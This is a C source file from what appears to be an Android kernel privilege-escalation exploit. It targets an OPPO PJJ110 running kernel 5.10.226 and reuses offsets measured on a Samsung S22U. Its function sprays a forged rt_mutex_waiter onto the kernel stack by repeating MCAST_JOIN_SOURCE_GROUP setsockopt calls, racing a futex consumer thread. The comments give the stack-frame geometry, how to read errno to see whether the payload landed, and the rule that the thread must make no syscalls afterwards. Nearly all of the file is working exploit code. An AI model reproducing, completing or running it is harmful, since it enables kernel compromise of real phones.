/*
 * exp64 stack stamper — sprays the payload onto the waiter's kernel
 * stack via MCAST_JOIN_SOURCE_GROUP setsockopt racing the consumer.
 * 64-bit native path (PJJ110 / OPPO, 5.10.226-android12-9-o).
 *
 * The compat (32-bit) setsockopt path is structurally dead on PJJ110:
 * __arm64_compat_sys_setsockopt / getsockopt are ENOSYS stubs (verified
 * from recovered kallsyms, 2026-08-21).  The 64-bit native path is used
 * instead: TIF_32BIT=0 causes do_ipv6_setsockopt to take the native
 * group_source_req branch (optlen=264).
 *
 * S22U (S901WVLS4DWL3, 5.10.168) geometry — disassembly-derived:
 *   STAMP_OFF = 0x60 (rt_waiter at kernel_top - 0x1f0, gr at
 *   kernel_top - 0x250).  PJJ110: UNMEASURED.  PJJ110's frames differ:
 *     futex_wait_requeue_pi: sub sp,#0x70 (S22U b0q was #0x1a0)
 *     do_ipv6_setsockopt:    stp x29,#-0x30 (S22U was 0x2e0 total)
 *   so the S22U 0x60 does NOT transfer.  Re-measure W via the perf SP
 *   leak (docs/5.10-pjj110.md) and set EXP64_STAMP_OFF = W - gr before
 *   trusting the chain.
 */
#define _GNU_SOURCE

#include <errno.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

#include "kernelsnitch/utils.h"

#ifndef pr_debug
#define pr_debug(fmt, ...) ((void)0)
#endif

extern atomic_int g_consumer_go;

/* PJJ110: UNMEASURED — S22U exp64 value kept ONLY as a compile placeholder.
 * S22U (5.10.168 native) measured 0x60; PJJ110 (5.10.226) has a different
 * futex_wait_requeue_pi frame (sub #0x70) and different setsockopt frames,
 * so this MUST be re-measured on device before any real run. */
#define EXP64_STAMP_OFF 0x60
/* v5.10 rt_mutex_waiter = 80 bytes */
#define EXP64_WAITER_BYTES 0x50
/* Native group_source_req = 264 bytes (compat was 260); optlen must match. */
#define EXP64_OPTLEN 264
/* Enough stamps to be sure the full payload is what the last completed
 * call left on the stack; after the loop we never enter the kernel again. */
#define EXP64_STAMP_ROUNDS 64

void do_stamp_stack(uint64_t *buf){
    int fd = socket(AF_INET6, SOCK_DGRAM, 0);
    uint8_t buffer[EXP64_OPTLEN];
    if (fd < 0) {
        pr_warning("do_stamp_stack: socket failed errno=%d\n", errno);
        _exit(1);   /* let the parent retry with a fresh child */
    }
    memset(buffer, 0, sizeof(buffer));
    memcpy(buffer + EXP64_STAMP_OFF, buf, EXP64_WAITER_BYTES);

    /*
     * Probe ONE stamp and report it BEFORE the real loop.  After the last
     * setsockopt this thread must make NO more syscalls until the consumer
     * fires: any syscall re-enters the kernel on THIS stack and its frames
     * land right on the stale waiter, tearing the payload.
     *
     * Native path (TIF_32BIT=0): do_ipv6_setsockopt takes the native
     * group_source_req branch unconditionally.  optlen=264 is accepted;
     * EACCES = SELinux denied before the copy (stamp did NOT land);
     * EADDRNOTAVAIL/EINVAL = late validation, copy already done (stamp lands);
     * rc=0 = socket actually joined (stamp lands).
     */
    errno = 0;
    {
        int rc = setsockopt(fd, IPPROTO_IPV6, MCAST_JOIN_SOURCE_GROUP,
                            buffer, EXP64_OPTLEN);
        if (rc != 0 && errno == EACCES)
            pr_warning("stamp probe: EACCES — denied BEFORE the copy, "
                       "payload will NOT land\n");
        else if (rc != 0)
            pr_info("stamp probe: rc=%d errno=%d — late validation, "
                    "copy done (stamp lands)\n", rc, errno);
        else
            pr_info("stamp probe: setsockopt succeeded\n");
    }

    for (int i = 0; i < EXP64_STAMP_ROUNDS; i++)
        setsockopt(fd, IPPROTO_IPV6, MCAST_JOIN_SOURCE_GROUP,
                   buffer, EXP64_OPTLEN);

    /* Payload is parked: from here on this thread makes NO syscalls, so
     * nothing memsets or overwrites the waiter region again. */
    atomic_store(&g_consumer_go, 1);
    for (;;)
        __asm__ volatile("nop" ::: "memory");
}
